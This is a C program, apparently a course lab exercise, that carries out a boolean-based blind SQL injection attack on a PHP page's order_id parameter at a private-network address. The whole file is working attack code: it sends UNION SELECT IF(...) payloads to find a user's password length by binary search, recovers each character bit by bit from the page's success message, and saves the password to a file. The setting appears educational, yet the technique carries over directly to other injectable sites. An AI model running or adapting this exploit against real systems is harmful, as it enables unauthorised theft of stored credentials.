#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>

#define MAX_PASSWORD_LENGTH 10
#define MIN_ASCII 0x20
#define MAX_ASCII 0x7E
#define REQUEST_BUFFER_SIZE 8192
#define RESPONSE_BUFFER_SIZE 4096
#define PAYLOAD_BUFFER_SIZE 2048
#define SERVER_IP "192.168.1.202"
#define SERVER_PORT 80
#define SUCCESS_MSG "Your order has been sent!"
#define STUDENT_ID "322314303"
#define MAX_QUERIES 100
#define BITS_PER_CHAR 7

typedef struct {
    int sock;
    struct sockaddr_in server_addr;
} Connection;

int query_count = 0;

static void url_encode(const char *src, char *dst, size_t dst_size) {
    const char *hex = "0123456789ABCDEF";
    size_t dst_len = 0;

    fprintf(stderr, "[DEBUG] URL encoding string: %s\n", src);

    while (*src && dst_len + 4 < dst_size) {
        if (isalnum((unsigned char)*src) || *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            dst[dst_len++] = *src;
        } else if (*src == ' ') {
            dst[dst_len++] = '+';
        } else {
            dst[dst_len++] = '%';
            dst[dst_len++] = hex[((unsigned char)*src) >> 4];
            dst[dst_len++] = hex[((unsigned char)*src) & 15];
        }
        src++;
    }
    dst[dst_len] = '\0';

    fprintf(stderr, "[DEBUG] URL encoded result: %s\n", dst);
}

static void init_connection(Connection *conn) {
    fprintf(stderr, "[DEBUG] Initializing connection to %s:%d\n", SERVER_IP, SERVER_PORT);

    conn->sock = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->sock < 0) {
        fprintf(stderr, "[ERROR] Socket creation failed\n");
        perror("Socket error");
        exit(1);
    }

    memset(&conn->server_addr, 0, sizeof(conn->server_addr));
    conn->server_addr.sin_family = AF_INET;
    conn->server_addr.sin_port = htons((uint16_t)SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &conn->server_addr.sin_addr) <= 0) {
        fprintf(stderr, "[ERROR] Invalid address\n");
        perror("Address error");
        close(conn->sock);
        exit(1);
    }

    if (connect(conn->sock, (struct sockaddr *)&conn->server_addr, sizeof(conn->server_addr)) < 0) {
        fprintf(stderr, "[ERROR] Connection failed\n");
        perror("Connect error");
        close(conn->sock);
        exit(1);
    }

    fprintf(stderr, "[DEBUG] Connection established successfully\n");
}

static int check_response(const char *response) {
    const char *body = strstr(response, "\r\n\r\n");
    if (body == NULL) {
        fprintf(stderr, "[ERROR] Invalid response format\n");
        return 0;
    }
    body += 4;

    int result = strstr(body, SUCCESS_MSG) != NULL;
    fprintf(stderr, "[DEBUG] Response check result: %s\n", result ? "success" : "failure");

    return result;
}

static int send_request(Connection *conn, const char *payload, char *response, size_t response_size) {
    if (query_count >= MAX_QUERIES) {
        fprintf(stderr, "[ERROR] Maximum number of queries reached\n");
        return -1;
    }
    query_count++;

    char encoded_payload[PAYLOAD_BUFFER_SIZE];
    char request[REQUEST_BUFFER_SIZE];
    ssize_t bytes_received;
    int request_len;

    url_encode(payload, encoded_payload, sizeof(encoded_payload));
    fprintf(stderr, "[DEBUG] Sending payload: %s\n", payload);

    request_len = snprintf(request, REQUEST_BUFFER_SIZE,
                           "GET /index.php?order_id=%s HTTP/1.1\r\n"
                           "Host: %s\r\n"
                           "Connection: close\r\n\r\n",
                           encoded_payload, SERVER_IP);

    if (request_len < 0 || request_len >= REQUEST_BUFFER_SIZE) {
        fprintf(stderr, "[ERROR] Request buffer too small\n");
        return -1;
    }

    if (send(conn->sock, request, (size_t)request_len, 0) < 0) {
        fprintf(stderr, "[ERROR] Send failed\n");
        perror("Send error");
        return -1;
    }

    bytes_received = recv(conn->sock, response, response_size - 1, 0);
    if (bytes_received < 0) {
        fprintf(stderr, "[ERROR] Receive failed\n");
        perror("Receive error");
        return -1;
    }

    response[bytes_received] = '\0';
    fprintf(stderr, "[DEBUG] Received %zd bytes\n", bytes_received);

    close(conn->sock);
    init_connection(conn);

    return 0;
}

static int find_password_length(Connection *conn) {
    char response[RESPONSE_BUFFER_SIZE];
    char payload[PAYLOAD_BUFFER_SIZE];

    fprintf(stderr, "[DEBUG] Finding password length using binary search...\n");

    int low = 1, high = MAX_PASSWORD_LENGTH;
    while (low <= high) {
        int mid = (low + high) / 2;

        // Construct the payload to check if the password length is <= mid
        int payload_len = snprintf(payload, PAYLOAD_BUFFER_SIZE,
                                   "0 UNION SELECT IF(LENGTH(password)<=%d,1,NULL) FROM users WHERE id='%s'",
                                   mid, STUDENT_ID);

        if (payload_len < 0 || payload_len >= PAYLOAD_BUFFER_SIZE) {
            fprintf(stderr, "[ERROR] Payload buffer too small\n");
            continue;
        }

        // Send the request and check the response
        if (send_request(conn, payload, response, sizeof(response)) < 0) {
            fprintf(stderr, "[ERROR] Request failed\n");
            continue;
        }

        // Adjust the search range based on the response
        if (check_response(response)) {
            high = mid - 1;  // Length is <= mid
        } else {
            low = mid + 1;   // Length is > mid
        }
    }

    // The correct length is 'low'
    fprintf(stderr, "[DEBUG] Found password length: %d\n", low);
    return low;
}

static int get_bit(Connection *conn, int pos, int bit) {
    char response[RESPONSE_BUFFER_SIZE];
    char payload[PAYLOAD_BUFFER_SIZE];

    int payload_len = snprintf(payload, PAYLOAD_BUFFER_SIZE,
                               "0 UNION SELECT IF((SELECT (ASCII(SUBSTR(password,%d,1))>>%d)&1 "
                               "FROM users WHERE id='%s' LIMIT 0,1)=1,1,NULL)",
                               pos, bit, STUDENT_ID);

    if (payload_len < 0 || payload_len >= PAYLOAD_BUFFER_SIZE) {
        fprintf(stderr, "[ERROR] Payload buffer too small\n");
        return -1;
    }

    if (send_request(conn, payload, response, sizeof(response)) < 0) {
        fprintf(stderr, "[ERROR] Request failed\n");
        return -1;
    }

    int result = check_response(response);
    fprintf(stderr, "[DEBUG] Bit %d at position %d = %d\n", bit, pos, result);
    return result;
}

static unsigned char extract_char(Connection *conn, int pos) {
    unsigned char c = 0;
    fprintf(stderr, "[DEBUG] Extracting character at position %d\n", pos);

    for (int bit = BITS_PER_CHAR - 1; bit >= 0; bit--) {
        int bit_val = get_bit(conn, pos, bit);
        if (bit_val < 0) {
            fprintf(stderr, "[ERROR] Failed to get bit %d\n", bit);
            return '?';
        }
        c |= ((unsigned char)(bit_val & 1) << (unsigned char)bit);
        fprintf(stderr, "[DEBUG] Got bit %d = %d, current char value: %d\n",
                bit, bit_val, c);
    }

    fprintf(stderr, "[DEBUG] Extracted character value: %d ('%c')\n",
            c, isprint(c) ? (char)c : '?');
    return c;
}

static void find_password(Connection *conn, char *password, int length) {
    fprintf(stderr, "[DEBUG] Starting password extraction (length: %d)\n", length);

    for (int pos = 1; pos <= length; pos++) {
        unsigned char c = extract_char(conn, pos);

        if (c < MIN_ASCII || c > MAX_ASCII) {
            fprintf(stderr, "[ERROR] Invalid character at position %d: %d\n", pos, c);
            password[pos - 1] = '?';
        } else {
            password[pos - 1] = (char)c;
            fprintf(stderr, "[DEBUG] Found character at position %d: '%c' (ASCII: %d)\n",
                    pos, password[pos - 1], password[pos - 1]);
        }
    }
    password[length] = '\0';

    fprintf(stderr, "[DEBUG] Complete password: '%s'\n", password);
}

static void save_result(const char *password) {
    char filename[PAYLOAD_BUFFER_SIZE];
    int filename_len;

    filename_len = snprintf(filename, sizeof(filename), "%s.txt", STUDENT_ID);
    if (filename_len < 0 || filename_len >= (int)sizeof(filename)) {
        fprintf(stderr, "[ERROR] Filename buffer too small\n");
        exit(1);
    }

    FILE *f = fopen(filename, "w");
    if (f == NULL) {
        fprintf(stderr, "[ERROR] Failed to open output file: %s\n", filename);
        perror("File error");
        exit(1);
    }

    fprintf(f, "*%s*", password);
    fclose(f);

    fprintf(stderr, "[DEBUG] Password saved to %s\n", filename);
}

int main(void) {
    Connection conn;
    char password[MAX_PASSWORD_LENGTH + 1];

    fprintf(stderr, "[DEBUG] Starting SQL injection attack for ID: %s\n", STUDENT_ID);

    init_connection(&conn);

    int password_length = find_password_length(&conn);
    if (password_length < 0) {
        fprintf(stderr, "[ERROR] Failed to find password length\n");
        close(conn.sock);
        return 1;
    }

    find_password(&conn, password, password_length);
    save_result(password);

    close(conn.sock);
    fprintf(stderr, "[INFO] Attack completed. Found password: %s\n", password);
    return 0;
}
